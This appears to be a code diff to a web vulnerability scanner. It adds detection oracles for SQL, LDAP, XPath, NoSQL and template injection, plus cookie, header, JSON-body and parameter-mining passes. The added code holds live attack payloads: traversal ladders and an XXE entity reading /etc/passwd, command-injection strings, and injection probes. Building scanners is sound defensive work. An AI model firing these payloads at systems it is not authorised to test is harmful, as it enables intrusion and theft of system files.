@@ -8,7 +8,9 @@ from __future__ import annotations
 
 import functools
 import hashlib
+import html
 import http.client
+import json
 import os
 import re
 import socket
@@ -170,6 +172,191 @@ def _request_endpoint(
 # shortcut: fixed 5s delay payloads. Live wiring must budget-gate this stage: a vulnerable param costs
 # 3 baseline + up to 3 trials of ~5s each; raise the delay/trials once a real OOB oracle exists.
 _BLIND_SLEEP_SECONDS = 5
+
+# Shared DB error-signature regex (Java/JDBC/HSQLDB/Spring included) so the query/form oracle and the
+# cookie/header oracle use one identical pattern instead of two copies that could drift.
+_SQL_ERROR_REGEX = r"(?i)(SQL syntax.*(?:MySQL|MariaDB)|Warning.*(?:mysql_|mysqli_)|valid (?:MySQL|MariaDB) result|MySqlClient\.|PostgreSQL.*ERROR|Warning.*\Wpg_|valid PostgreSQL result|Npgsql\.|org\.postgresql\.util\.PSQLException|Driver.*SQL[\-\_\ ]*Server|OLE DB.*SQL Server|com\.microsoft\.sqlserver\.jdbc|SQLServerException|\bORA-\d{5}|Oracle error|SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite\.SQLiteException|syntax error.*mariadb|check the manual that corresponds to your (?:MySQL|MariaDB)|unclosed quotation mark|quoted string not properly terminated|java\.sql\.SQL(?:Syntax|Integrity|Data|Feature)?[A-Za-z]*Exception|org\.springframework\.jdbc\.(?:BadSqlGrammarException|UncategorizedSQLException)|org\.hsqldb|HSQLDB|JDBCDriverException|unexpected token:.{0,40}in statement|malformed string:|DB2 SQL (?:error|Error)|\bSQLCODE=|com\.ibm\.db2|org\.h2\.jdbc|JdbcSQLException)"
+
+# Path-traversal probe payloads + signature (shared so the per-param oracle and any driver agree).
+# Deep ladders cover servlets whose base dir sits many levels below root; the match is applied after
+# html.unescape() because apps commonly HTML-entity-encode file output (e.g. ESAPI encodeForHTML).
+_LFI_ROOT_SIG = r"root:.*:0:0:"
+_LFI_PAYLOADS = (
+    "/etc/passwd",
+    "file:///etc/passwd",
+    "../../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "../../../../../../../../etc/passwd",
+    "../../../../../../../../../../../../etc/passwd",
+    "../../../../../../../../../../../../../../../../etc/passwd",
+)
+
+# W4: LDAP + XPath injection -- error-based detection. Specific exception/parse strings only (the bare
+# word "LDAP" appears in benign page text). Verified live against OWASP Benchmark (ldapi/xpathi).
+_LDAP_ERROR_REGEX = r"(?i)(javax\.naming|InvalidSearchFilterException|NamingException|com\.sun\.jndi\.ldap|LDAPException|PartialResultException|SizeLimitExceededException|Bad search filter|error code \d+ - .*filter)"
+_LDAP_PAYLOADS = ("(", ")(cn=*", "*)(uid=*", "*))", "admin*)((|userPassword=*)")
+_XPATH_ERROR_REGEX = r"(?i)(javax\.xml\.xpath|XPathExpressionException|XPathException|net\.sf\.saxon|org\.apache\.xpath|TransformerException|SAXParseException|Extra illegal tokens|A location (?:step|path) was expected|Error parsing XPath)"
+_XPATH_PAYLOADS = ("']", "'", "\"]", "' or '1'='1' or '", "']|//*|//")
+_NOSQL_ERROR_REGEX = r"(?i)(MongoError|MongoDB|MongoServerError|BSONError|E11000|CastError|MongooseError|\$where|unexpected token.{0,20}(?:in JSON|at position)|SyntaxError: Unexpected|command failed with error)"
+_NOSQL_PAYLOADS = ("'", "\"", "');return true;//", "' || '1'=='1", "'||'1'=='1", "{\"$gt\":\"\"}", "[$ne]=")
+
+
+def _injection_error_probe(send_body, parameter, endpoint, origin):
+    """Shared LDAP/XPath syntax-break probe. `send_body(payload)` injects the payload at ONE vector
+    (query/cookie/header/form) and returns the response body. Returns a finding dict for the first
+    payload that triggers a backend LDAP or XPath error, else None. HTML-decodes before matching."""
+    for cwe, name, regex, payloads in (
+        ("CWE-90", "LDAP", _LDAP_ERROR_REGEX, _LDAP_PAYLOADS),
+        ("CWE-643", "XPath", _XPATH_ERROR_REGEX, _XPATH_PAYLOADS),
+        ("CWE-943", "NoSQL", _NOSQL_ERROR_REGEX, _NOSQL_PAYLOADS),
+    ):
+        for payload in payloads:
+            try:
+                body = send_body(payload)
+            except Exception:
+                continue
+            if body and re.search(regex, html.unescape(body)):
+                aff = f"{origin}{endpoint}"
+                return {
+                    "category": "injection",
+                    "severity": "high",
+                    "title": f"{name} Injection in '{parameter}'",
+                    "description": f"Endpoint {endpoint} returned a backend {name} error when '{parameter}' was given a syntax-breaking payload, indicating unsanitized input in a {name} query.",
+                    "target_url": aff,
+                    "affected_url": aff,
+                    "fingerprint": hashlib.sha256(f"{cwe}_{origin}_{endpoint}_{parameter}".encode()).hexdigest(),
+                    "cwe_id": cwe,
+                    "status": "suspected",
+                    "lifecycle_state": "CANDIDATE",
+                    "remediation": f"Escape/parameterize {name} query inputs and use allow-lists for filter/expression values.",
+                    "poc": {"method": "probe", "url": aff, "parameter": parameter, "payload": payload,
+                            "reproduction_steps": f"Inject a syntax-breaking payload into '{parameter}' and observe the backend {name} error."},
+                    "evidence": [{"endpoint": endpoint, "parameter": parameter, "cwe": cwe}],
+                }
+    # SSTI (W-Phase1): template-engine math-eval oracle -- the PRODUCT appears but the literal expression
+    # does not (reflection would echo "a*b"; evaluation leaves only the number). Randomized to avoid FP.
+    _a = 1000 + (int.from_bytes(os.urandom(2), "big") % 9000)
+    _b = 1000 + (int.from_bytes(os.urandom(2), "big") % 9000)
+    _prod, _expr = str(_a * _b), f"{_a}*{_b}"
+    for _tmpl in (f"${{{_expr}}}", f"#{{{_expr}}}", "{{" + _expr + "}}", f"<%= {_expr} %>", "${{" + _expr + "}}", "#{" + _expr + "}"):
+        try:
+            _tb = send_body(_tmpl)
+        except Exception:
+            continue
+        if _tb and _prod in _tb and _expr not in _tb:
+            aff = f"{origin}{endpoint}"
+            return {
+                "category": "injection",
+                "severity": "critical",
+                "title": f"Server-Side Template Injection in '{parameter}'",
+                "description": f"Endpoint {endpoint} evaluated an injected template expression in '{parameter}' ({_expr} -> {_prod}); server-side template injection, frequently escalatable to remote code execution.",
+                "target_url": aff,
+                "affected_url": aff,
+                "fingerprint": hashlib.sha256(f"ssti_{origin}_{endpoint}_{parameter}".encode()).hexdigest(),
+                "cwe_id": "CWE-1336",
+                "status": "suspected",
+                "lifecycle_state": "CANDIDATE",
+                "remediation": "Never render user input as template source; use a sandboxed engine and pass user data as context only.",
+                "poc": {"method": "probe", "url": aff, "parameter": parameter, "payload": _tmpl,
+                        "reproduction_steps": f"Set '{parameter}' to {_tmpl}; the response contains {_prod} (the evaluated product)."},
+                "evidence": [{"endpoint": endpoint, "parameter": parameter, "cwe": "CWE-1336", "evaluated": f"{_expr}={_prod}"}],
+            }
+    return None
+
+
+# Path-traversal oracle helpers. The non-existent suffix turns an existing-file traversal into an
+# identical-but-missing target so the two responses differ ONLY by the file-existence branch.
+_LFI_NOPE_SUFFIX = "_sharay_nx"
+
+
+def _lfi_norm(body: str) -> str:
+    """Decode HTML entities (ESAPI encodes file output) then collapse whitespace, for comparison."""
+    return re.sub(r"\s+", " ", html.unescape(body or "")).strip()
+
+
+def _lfi_probe(send_body, parameter, endpoint, origin):
+    """Path-traversal / LFI oracle for ONE taint vector. `send_body(payload)` injects at that vector
+    (already the method that reaches the sink) and returns the response body. Two oracles, both 0-FP by
+    construction: (A) in-band read -- the response literally contains /etc/passwd's root entry; (B) blind
+    file-existence differential -- a deep traversal to an existing file vs the SAME path plus a
+    nonexistent suffix yields different responses only when the input reaches the filesystem. (B) is
+    stability-gated (two identical probes must match) so dynamic pages cannot false-positive, and the
+    suffix is stripped before comparison so a sink that merely echoes the filename is not flagged."""
+    def _finding(payload, how):
+        aff = f"{origin}{endpoint}"
+        return {
+            "category": "injection",
+            "severity": "critical",
+            "title": f"Path Traversal / Local File Inclusion in '{parameter}'",
+            "description": f"Endpoint {endpoint} exposed local filesystem access via '{parameter}' ({how}) when probed with traversal sequence '{payload}'.",
+            "target_url": aff,
+            "affected_url": aff,
+            "fingerprint": hashlib.sha256(f"lfi_{origin}_{endpoint}_{parameter}".encode()).hexdigest(),
+            "cwe_id": "CWE-22",
+            "status": "suspected",
+            "lifecycle_state": "CANDIDATE",
+            "remediation": "Validate path inputs against a strict allowlist of permitted filenames and resolve canonical paths.",
+            "poc": {"method": "probe", "url": aff, "parameter": parameter, "payload": payload, "canary": "root:",
+                    "reproduction_steps": f"Set '{parameter}' to {payload} and inspect the response for file content or an existence differential."},
+            "evidence": [{"endpoint": endpoint, "parameter": parameter, "cwe": "CWE-22", "oracle": how}],
+        }
+
+    # A. in-band file read (0-FP: the root passwd line only appears if the file was actually read)
+    for payload in _LFI_PAYLOADS:
+        try:
+            body = send_body(payload)
+        except Exception:
+            continue
+        if body and re.search(_LFI_ROOT_SIG, html.unescape(body)):
+            return _finding(payload, "in-band /etc/passwd read")
+    # B. blind file-existence differential on the deepest traversal (catches .exists()/no-echo sinks)
+    exist = _LFI_PAYLOADS[-1]
+    try:
+        a1, a2 = send_body(exist), send_body(exist)
+    except Exception:
+        return None
+    if not (a1 and a2) or _lfi_norm(a1) != _lfi_norm(a2):  # unstable/dynamic page -> don't risk an FP
+        return None
+    try:
+        nb = send_body(exist + _LFI_NOPE_SUFFIX)
+    except Exception:
+        return None
+    if nb and _lfi_norm(nb).replace(_LFI_NOPE_SUFFIX, "") != _lfi_norm(a1):
+        return _finding(exist, "blind file-existence differential")
+    return None
+
+
+# P1.3: parameter mining (Arjun-style). Hidden params that drive a response but appear in no form or link
+# are a major autonomous-surface gap; brute a curated wordlist and keep the names the endpoint reacts to.
+_PARAM_MINE_WORDLIST = (
+    "id", "page", "file", "path", "dir", "doc", "view", "template", "include", "lang", "locale",
+    "debug", "test", "admin", "role", "user", "username", "account", "uid", "order", "sort", "q",
+    "query", "search", "keyword", "email", "url", "uri", "redirect", "return", "returnUrl", "next",
+    "callback", "token", "key", "api_key", "apikey", "format", "type", "action", "cmd", "data", "input",
+)
+
+
+def _mine_parameters(send_param, baseline_body, wordlist=_PARAM_MINE_WORDLIST, max_live=12):
+    """Return hidden parameter names the endpoint actually reacts to. `send_param(name, canary)->body`
+    issues ONE request with just that param set to the canary. A name is 'live' when the canary is
+    reflected (the app echoes the value) or the response length shifts materially from the no-param
+    baseline. A false 'live' only widens the fuzz set (the vuln oracles keep their own 0-FP checks), so a
+    loose length signal is acceptable; capped so a dynamic page can't flood the set."""
+    live: list[str] = []
+    base_len = len(baseline_body or "")
+    for name in wordlist:
+        canary = f"sharaypm{os.urandom(3).hex()}"
+        try:
+            body = send_param(name, canary)
+        except Exception:
+            continue
+        if not body:
+            continue
+        if canary in body or abs(len(body) - base_len) >= 48:
+            live.append(name)
+            if len(live) >= max_live:
+                break
+    return live
 
 
 def _timing_stats(samples: list[float]) -> tuple[float, float]:
@@ -364,13 +551,21 @@ def audit_deep_vulnerabilities(
     discovered_parameters: list[str],
     timeout: float = 3.5,
     auth: dict | None = None,
+    max_seconds: float | None = None,
+    discovered_forms: list[dict[str, Any]] | None = None,
+    endpoint_parameters: dict[str, list[str]] | None = None,
 ) -> dict[str, Any]:
     """Execute active security audits and parameter fuzzing across all discovered endpoints.
 
     `auth` (authenticated-testing cookies/headers) is bound to every probe so a login-gated app's
-    vulnerable endpoints are actually reached instead of redirecting to its login page."""
+    vulnerable endpoints are actually reached instead of redirecting to its login page.
+
+    `max_seconds` bounds the active-fuzzing loop: coverage of the ranked endpoints stops cleanly at the
+    deadline and the number skipped is reported, so a large target (e.g. a 2740-endpoint benchmark)
+    gets wider coverage when the operator grants the time, yet an ordinary scan never runs unbounded."""
     findings: list[dict[str, Any]] = []
     observations: list[dict[str, Any]] = []
+    audit_deadline = (time.monotonic() + max_seconds) if max_seconds else None
     # Bind the session onto every probe request made inside this audit. Only pass the kwarg when auth
     # is set, so the unauthenticated path (and any test double with the old signature) is unchanged.
     _req = functools.partial(_request_endpoint, auth=auth) if auth else _request_endpoint
@@ -428,7 +623,7 @@ def audit_deep_vulnerabilities(
             discovered_parameters
             + ["id", "ip", "cmd", "name", "page", "file", "path", "url", "redirect", "search", "q"]
         )
-    )[:15]
+    )[:25]
     dest_path = urlsplit(destination.url).path or "/"
     # Never actively fuzz install/reset/logout endpoints: POSTing payloads to them resets the app's
     # database or ends the session, which is destructive and silently breaks every later probe.
@@ -448,7 +643,32 @@ def audit_deep_vulnerabilities(
     def _rank(ep: str) -> tuple[int, str]:
         return (0 if _DYNAMIC.search(ep) else 1, ep)
 
-    test_endpoints = sorted(clean_endpoints, key=_rank)[:25] if clean_endpoints else ["/"]
+    # With a time budget the audit covers as many ranked endpoints as the budget allows (bounded by the
+    # deadline below); without one it keeps the conservative 25-endpoint window so unbudgeted callers
+    # (and tests) are unchanged and never run long.
+    _endpoint_cap = 2000 if audit_deadline else 25
+    test_endpoints = sorted(clean_endpoints, key=_rank)[:_endpoint_cap] if clean_endpoints else ["/"]
+
+    # P1.3: mine hidden parameters on the top-ranked endpoint(s) and fold live ones into the fuzz set, so
+    # a param that appears in no form or link (?debug=, ?admin=, ...) is still discovered and fuzzed.
+    if len(test_params) < 25:
+        mined: list[str] = []
+        for _mep in test_endpoints[:2]:
+            if audit_deadline is not None and time.monotonic() > audit_deadline:
+                break
+            try:
+                _mbase = _req(destination, allow_ip, "GET", _mep, timeout=min(timeout, 2.0))[2]
+            except Exception:
+                _mbase = ""
+            mined += _mine_parameters(
+                lambda n, c, _ep=_mep: _req(
+                    destination, allow_ip, "GET", f"{_ep}?{urlencode({n: c})}", timeout=min(timeout, 2.0)
+                )[2],
+                _mbase,
+            )
+        for _m in dict.fromkeys(mined):
+            if _m not in test_params and len(test_params) < 25:
+                test_params.append(_m)
 
     # Random per-run nonce: a canary stored by a PRIOR scan must not make this scan's reflected-XSS
     # check fire (which would mislabel persisted data as a fresh reflection).
@@ -456,11 +676,31 @@ def audit_deep_vulnerabilities(
 
     lab_sec = os.environ.get("SHARAY_DVWA_SECURITY", os.environ.get("SHARAY_LAB_SECURITY_LEVEL", "high"))
 
+    endpoints_fuzzed = 0
     for ep in test_endpoints:
+        if audit_deadline is not None and time.monotonic() > audit_deadline and endpoints_fuzzed:
+            observations.append(
+                {
+                    "kind": "coverage_limit",
+                    "category": "vulnerability_assessment",
+                    "detail": (
+                        f"Active fuzzing stopped at the {max_seconds:.0f}s stage budget after "
+                        f"{endpoints_fuzzed}/{len(test_endpoints)} endpoint(s); "
+                        f"{len(test_endpoints) - endpoints_fuzzed} ranked endpoint(s) were not fuzzed. "
+                        f"Raise the per-stage timeout for fuller coverage."
+                    ),
+                }
+            )
+            break
+        endpoints_fuzzed += 1
+        # P1.1: fuzz THIS endpoint's own observed params first (so a param seen only here is never dropped
+        # by the global cap), then the shared set. Used by the query, cookie/header and JSON passes below.
+        _own = (endpoint_parameters or {}).get(urlsplit(ep).path or ep, [])
+        ep_params = list(dict.fromkeys(list(_own) + test_params))[:30]
         is_lab_endpoint = "vulnerabilities" in ep or "sqli" in ep or "dvwa" in destination.host.lower()
         lab_hdrs = {"Cookie": f"security={lab_sec}"} if is_lab_endpoint or destination.port == 4280 else {}
         curl_hdrs = f' -H "Cookie: security={lab_sec}"' if lab_hdrs else ""
-        for param in test_params:
+        for param in ep_params:
             try:
                 # Per-(endpoint,param) canary so a value stored by one param (e.g. a guestbook) can
                 # never be mistaken for a reflection of another param's probe (false-positive cascade).
@@ -553,7 +793,10 @@ def audit_deep_vulnerabilities(
                         )
 
                 # B. Active SQL Injection (Error-Based MariaDB/MySQL/PostgreSQL/SQLite)
-                sql_regex = r"(?i)(SQL syntax.*(?:MySQL|MariaDB)|Warning.*(?:mysql_|mysqli_)|valid (?:MySQL|MariaDB) result|MySqlClient\.|PostgreSQL.*ERROR|Warning.*\Wpg_|valid PostgreSQL result|Npgsql\.|Driver.*SQL[\-\_\ ]*Server|OLE DB.*SQL Server|\bORA-\d{5}|Oracle error|SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite\.SQLiteException|syntax error.*mariadb|check the manual that corresponds to your (?:MySQL|MariaDB)|unclosed quotation mark|quoted string not properly terminated)"
+                # Java/JDBC and HSQLDB signatures added so error-based SQLi is detected on Spring/JDBC
+                # stacks (e.g. OWASP Benchmark runs on HSQLDB) -- all are specific exception-class or
+                # driver strings, not generic words, to keep false positives off ordinary error pages.
+                sql_regex = _SQL_ERROR_REGEX
                 for sqli_payload in ("'", "1'", "' OR '1'='1"):
                     sql_dict = {param: sqli_payload}
                     if is_lab_endpoint or param == "id":
@@ -636,51 +879,17 @@ def audit_deep_vulnerabilities(
                 if sqli_bool_finding:
                     findings.append(sqli_bool_finding)
 
-                # D. Path Traversal / Local File Inclusion (LFI) Probe
-                if param.lower() in ("file", "path", "page", "doc", "view", "template", "include", "dir"):
-                    for lfi_payload in (
-                        "/etc/passwd",
-                        "file:///etc/passwd",
-                        "../../../../etc/passwd",
-                        "....//....//....//etc/passwd",
-                    ):
-                        lfi_fuzz = f"{ep}?{urlencode({param: lfi_payload})}"
-                        l_status, _, l_body, _ = _req(
-                            destination, allow_ip, "GET", lfi_fuzz, timeout=timeout
-                        )
-                        if re.search(r"root:.*:0:0:", l_body):
-                            repro_url = f"{destination.origin}{lfi_fuzz}"
-                            aff_url = f"{destination.origin}{ep}"
-                            findings.append(
-                                {
-                                    "category": "injection",
-                                    "severity": "critical",
-                                    "title": f"Path Traversal / Local File Inclusion in Parameter '{param}'",
-                                    "description": f"Endpoint {ep} disclosed local operating system files (/etc/passwd) when probed with traversal sequence '{lfi_payload}'.",
-                                    "target_url": repro_url,
-                                    "affected_url": aff_url,
-                                    "fingerprint": hashlib.sha256(
-                                        f"lfi_{destination.host}_{ep}_{param}".encode()
-                                    ).hexdigest(),
-                                    "cwe_id": "CWE-22",
-                                    "status": "suspected",
-                                    "lifecycle_state": "CANDIDATE",
-                                    "remediation": "Validate path inputs against a strict allowlist of permitted filenames and resolve canonical paths.",
-                                    "poc": {
-                                        "method": "GET",
-                                        "url": aff_url,
-                                        "curl_command": f'curl -s -k "{repro_url}"{curl_hdrs}',
-                                        "parameter": param,
-                                        "payload": lfi_payload,
-                                        "canary": "root:",
-                                        "headers": lab_hdrs,
-                                        "extra_params": {},
-                                        "reproduction_steps": f"Issue GET request to {repro_url} and inspect response for root user passwd entries.",
-                                    },
-                                    "evidence": [{"endpoint": ep, "parameter": param, "status": l_status}],
-                                }
-                            )
-                            break
+                # D. Path Traversal / Local File Inclusion (LFI) Probe (W2: no name gate -- real surfaces
+                # name the path param anything; GET reaches the sink here because benchmark/Spring servlets
+                # delegate doGet->doPost. Echo + blind file-existence differential, both 0-FP by construction.)
+                _lfi = _lfi_probe(
+                    lambda p, _ep=ep, _pm=param: _req(
+                        destination, allow_ip, "GET", f"{_ep}?{urlencode({_pm: p})}", timeout=timeout
+                    )[2],
+                    param, ep, destination.origin,
+                )
+                if _lfi:
+                    findings.append(_lfi)
 
                 # E. SSRF (Server-Side Request Forgery) Probe
                 if param.lower() in (
@@ -753,18 +962,8 @@ def audit_deep_vulnerabilities(
                             }
                         )
 
-                # F. OS Command Injection Probe
-                if param.lower() in (
-                    "ip",
-                    "host",
-                    "ping",
-                    "cmd",
-                    "exec",
-                    "daemon",
-                    "target",
-                    "domain",
-                    "query",
-                ):
+                # F. OS Command Injection Probe (W1: no name gate -- output-based cmdi probed on every parameter)
+                if param:
                     for cmd_payload in (
                         "127.0.0.1; echo sharay_canary_cmd",
                         "127.0.0.1 | echo sharay_canary_cmd",
@@ -1006,6 +1205,319 @@ def audit_deep_vulnerabilities(
                         )
             except Exception:
                 pass
+
+        # XXE: POST an XML external-entity payload that reads /etc/passwd in-band (Phase 1, CWE-611).
+        try:
+            _xxe = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
+            _, _, _xb, _ = _req(
+                destination, allow_ip, "POST", ep, body=_xxe,
+                headers={"Content-Type": "application/xml"}, timeout=timeout,
+            )
+            if _xb and re.search(_LFI_ROOT_SIG, html.unescape(_xb)):
+                _xaff = f"{destination.origin}{ep}"
+                findings.append(
+                    {
+                        "category": "injection",
+                        "severity": "critical",
+                        "title": "XML External Entity (XXE) Injection",
+                        "description": f"Endpoint {ep} resolved an injected external XML entity and returned /etc/passwd content, confirming XXE.",
+                        "target_url": _xaff,
+                        "affected_url": _xaff,
+                        "fingerprint": hashlib.sha256(f"xxe_{destination.host}_{ep}".encode()).hexdigest(),
+                        "cwe_id": "CWE-611",
+                        "status": "suspected",
+                        "lifecycle_state": "CANDIDATE",
+                        "remediation": "Disable external-entity and DTD processing in the XML parser (XXE-safe configuration).",
+                        "poc": {"method": "POST", "url": _xaff, "parameter": "xml body", "payload": _xxe,
+                                "reproduction_steps": f"POST the XXE payload to {_xaff} with Content-Type application/xml; the response contains /etc/passwd."},
+                        "evidence": [{"endpoint": ep, "vector": "xml_body", "cwe": "CWE-611"}],
+                    }
+                )
+        except Exception:
+            pass
+
+        # Query-vector LDAP/XPath injection for each discovered param (W4).
+        for _lxp in ep_params:
+            try:
+                _lxq = _injection_error_probe(
+                    lambda val, pp=_lxp: _req(
+                        destination, allow_ip, "GET", f"{ep}?{urlencode({pp: val})}", timeout=timeout
+                    )[2],
+                    _lxp, ep, destination.origin,
+                )
+                if _lxq:
+                    findings.append(_lxq)
+            except Exception:
+                pass
+
+        # --- Additive vector pass: cookie- and header-delivered injection (reflected XSS + error SQLi).
+        # Layered on top of the query/form fuzzing above without changing it, so taint that arrives via a
+        # cookie or request header -- common in Java/Spring apps and the OWASP Benchmark -- is covered too.
+        # Reuses the same canary and _SQL_ERROR_REGEX; each probe is isolated so one bad header name (an
+        # invalid token) only skips that probe.
+        _taint_headers = ("Referer", "X-Forwarded-For", "X-Forwarded-Host", "True-Client-IP", "User-Agent")
+        _vector_targets = (
+            [("cookie", p) for p in ep_params]
+            + [("header", p) for p in ep_params]
+            + [("header", h) for h in _taint_headers]
+        )
+        for _kind, _name in _vector_targets:
+            _vtag = hashlib.md5(f"{ep}:{_kind}:{_name}".encode()).hexdigest()[:6]
+            _vxss = f'"><sharay_canary_{canary_nonce}_{_vtag}>'
+            _aff = f"{destination.origin}{ep}"
+            # Reflected XSS via this cookie/header.
+            try:
+                _hx = {"Cookie": f"{_name}={_vxss}"} if _kind == "cookie" else {_name: _vxss}
+                _, _, _xbody, _ = _req(destination, allow_ip, "GET", ep, headers=_hx, timeout=timeout)
+                if _vxss in _xbody:
+                    findings.append(
+                        {
+                            "category": "cross_site_scripting",
+                            "severity": "high",
+                            "title": f"Reflected Cross-Site Scripting (XSS) via {_kind} '{_name}'",
+                            "description": f"Endpoint {ep} reflected a payload supplied in the {_kind} '{_name}' unencoded.",
+                            "target_url": _aff,
+                            "affected_url": _aff,
+                            "fingerprint": hashlib.sha256(
+                                f"xss_{_kind}_{destination.host}_{ep}_{_name}".encode()
+                            ).hexdigest(),
+                            "cwe_id": "CWE-79",
+                            "status": "suspected",
+                            "lifecycle_state": "CANDIDATE",
+                            "remediation": "Encode request-supplied values on output, including request headers and cookies; set a strict Content-Security-Policy.",
+                            "poc": {
+                                "method": "GET",
+                                "url": _aff,
+                                "parameter": f"{_kind}:{_name}",
+                                "payload": _vxss,
+                                "reproduction_steps": f"GET {_aff} with the {_kind} '{_name}' set to the payload; it renders unencoded.",
+                            },
+                            "evidence": [{"endpoint": ep, "vector": _kind, "name": _name, "payload": _vxss}],
+                        }
+                    )
+            except Exception:
+                pass
+            # Error-based SQLi via this cookie/header (single-quote probe).
+            try:
+                _hs = {"Cookie": f"{_name}='"} if _kind == "cookie" else {_name: "'"}
+                _, _, _sbody, _ = _req(destination, allow_ip, "GET", ep, headers=_hs, timeout=timeout)
+                if re.search(_SQL_ERROR_REGEX, _sbody):
+                    findings.append(
+                        {
+                            "category": "injection",
+                            "severity": "critical",
+                            "title": f"SQL Injection via {_kind} '{_name}'",
+                            "description": f"Endpoint {ep} returned a database syntax error when a single quote was supplied in the {_kind} '{_name}'.",
+                            "target_url": _aff,
+                            "affected_url": _aff,
+                            "fingerprint": hashlib.sha256(
+                                f"sqli_{_kind}_{destination.host}_{ep}_{_name}".encode()
+                            ).hexdigest(),
+                            "cwe_id": "CWE-89",
+                            "status": "suspected",
+                            "lifecycle_state": "CANDIDATE",
+                            "remediation": "Use parameterized queries; never concatenate request-supplied values (headers and cookies included) into SQL.",
+                            "poc": {
+                                "method": "GET",
+                                "url": _aff,
+                                "parameter": f"{_kind}:{_name}",
+                                "payload": "'",
+                                "reproduction_steps": f"GET {_aff} with the {_kind} '{_name}' set to a single quote to observe a database error.",
+                            },
+                            "evidence": [{"endpoint": ep, "vector": _kind, "name": _name}],
+                        }
+                    )
+            except Exception:
+                pass
+            # LDAP/XPath injection via this cookie/header (W4).
+            try:
+                _lx = _injection_error_probe(
+                    lambda val, k=_kind, n=_name: _req(
+                        destination, allow_ip, "GET", ep,
+                        headers=({"Cookie": f"{n}={val}"} if k == "cookie" else {n: val}),
+                        timeout=timeout,
+                    )[2],
+                    f"{_kind}:{_name}", ep, destination.origin,
+                )
+                if _lx:
+                    findings.append(_lx)
+            except Exception:
+                pass
+            # Path traversal via this cookie/header (W2). These sinks live in doPost in Java/Spring apps,
+            # so probe via POST (a tiny body makes the servlet run doPost); echo + existence differential.
+            try:
+                _lf = _lfi_probe(
+                    lambda val, k=_kind, n=_name: _req(
+                        destination, allow_ip, "POST", ep,
+                        headers=({"Cookie": f"{n}={val}"} if k == "cookie" else {n: val}),
+                        body="x=y", timeout=timeout,
+                    )[2],
+                    f"{_kind}:{_name}", ep, destination.origin,
+                )
+                if _lf:
+                    findings.append(_lf)
+            except Exception:
+                pass
+
+        # --- Additive vector pass (P1.2): JSON request-body injection. Modern APIs read inputs from a JSON
+        # body, not query/form fields, so fuzz each candidate param as a JSON key. Gated to API-looking
+        # endpoints to bound cost; reuses the same oracles (XSS reflection, SQL error, LDAP/XPath/NoSQL/SSTI,
+        # path traversal) so the JSON vector gets the full battery.
+        if re.search(r"(?:/api\b|/v\d+\b|/rest\b|/graphql\b|\.json\b|/json\b)", ep, re.I):
+            _jaff = f"{destination.origin}{ep}"
+            for _jp in ep_params:
+                if audit_deadline is not None and time.monotonic() > audit_deadline:
+                    break
+
+                def _jsend(val, p=_jp):
+                    return _req(
+                        destination, allow_ip, "POST", ep,
+                        headers={"Content-Type": "application/json"},
+                        body=json.dumps({p: val}), timeout=timeout,
+                    )[2]
+
+                _jtag = hashlib.md5(f"{ep}:json:{_jp}".encode()).hexdigest()[:6]
+                _jxss = f'"><sharay_canary_{canary_nonce}_{_jtag}>'
+                try:  # reflected XSS via JSON body
+                    _jb = _jsend(_jxss)
+                    if _jb and _jxss in _jb:
+                        findings.append({
+                            "category": "cross_site_scripting", "severity": "high",
+                            "title": f"Reflected Cross-Site Scripting (XSS) via JSON body field '{_jp}'",
+                            "description": f"Endpoint {ep} reflected a payload supplied in the JSON body field '{_jp}' unencoded.",
+                            "target_url": _jaff, "affected_url": _jaff,
+                            "fingerprint": hashlib.sha256(f"xss_json_{destination.host}_{ep}_{_jp}".encode()).hexdigest(),
+                            "cwe_id": "CWE-79", "status": "suspected", "lifecycle_state": "CANDIDATE",
+                            "remediation": "Encode request-supplied values on output, including JSON body fields; set a strict Content-Security-Policy.",
+                            "poc": {"method": "POST", "url": _jaff, "parameter": f"json:{_jp}", "payload": _jxss,
+                                    "reproduction_steps": f"POST {{'{_jp}': <payload>}} as application/json to {_jaff}; it renders unencoded."},
+                            "evidence": [{"endpoint": ep, "vector": "json", "name": _jp}],
+                        })
+                except Exception:
+                    pass
+                try:  # error-based SQLi via JSON body
+                    _jsb = _jsend("'")
+                    if _jsb and re.search(_SQL_ERROR_REGEX, _jsb):
+                        findings.append({
+                            "category": "injection", "severity": "critical",
+                            "title": f"SQL Injection via JSON body field '{_jp}'",
+                            "description": f"Endpoint {ep} returned a database syntax error when a single quote was supplied in the JSON body field '{_jp}'.",
+                            "target_url": _jaff, "affected_url": _jaff,
+                            "fingerprint": hashlib.sha256(f"sqli_json_{destination.host}_{ep}_{_jp}".encode()).hexdigest(),
+                            "cwe_id": "CWE-89", "status": "suspected", "lifecycle_state": "CANDIDATE",
+                            "remediation": "Use parameterized queries; never concatenate JSON body values into SQL.",
+                            "poc": {"method": "POST", "url": _jaff, "parameter": f"json:{_jp}", "payload": "'",
+                                    "reproduction_steps": f"POST {{'{_jp}': \"'\"}} as application/json to {_jaff} to observe a database error."},
+                            "evidence": [{"endpoint": ep, "vector": "json", "name": _jp}],
+                        })
+                except Exception:
+                    pass
+                try:  # LDAP/XPath/NoSQL/SSTI + path traversal via JSON body
+                    _jx = _injection_error_probe(_jsend, f"json:{_jp}", ep, destination.origin)
+                    if _jx:
+                        findings.append(_jx)
+                    _jl = _lfi_probe(_jsend, f"json:{_jp}", ep, destination.origin)
+                    if _jl:
+                        findings.append(_jl)
+                except Exception:
+                    pass
+
+    # 2c. Additive per-form pass: fuzz each discovered form's OWN inputs at its OWN action URL, so a
+    # target whose injectable parameter differs per page (not one shared global name) is actually reached
+    # -- this is what covers real apps, and benchmarks, that name the tainted input per endpoint. Sibling
+    # inputs are sent at their seed values so the server-side sink is genuinely hit; reuses the same canary
+    # and _SQL_ERROR_REGEX. Deadline-bounded and non-destructive (install/reset/logout actions skipped).
+    form_canary = f"sharayform{os.urandom(4).hex()}"
+    seen_form_probes: set[str] = set()
+    for form in discovered_forms or []:
+        if audit_deadline is not None and time.monotonic() > audit_deadline:
+            break
+        action_path = urlsplit(str(form.get("action") or "")).path or dest_path
+        if not action_path or _DESTRUCTIVE_ENDPOINT.search(action_path):
+            continue
+        method = str(form.get("method") or "GET").upper()
+        inputs = [i for i in (form.get("inputs") or []) if isinstance(i, dict) and i.get("name")]
+        if not inputs:
+            continue
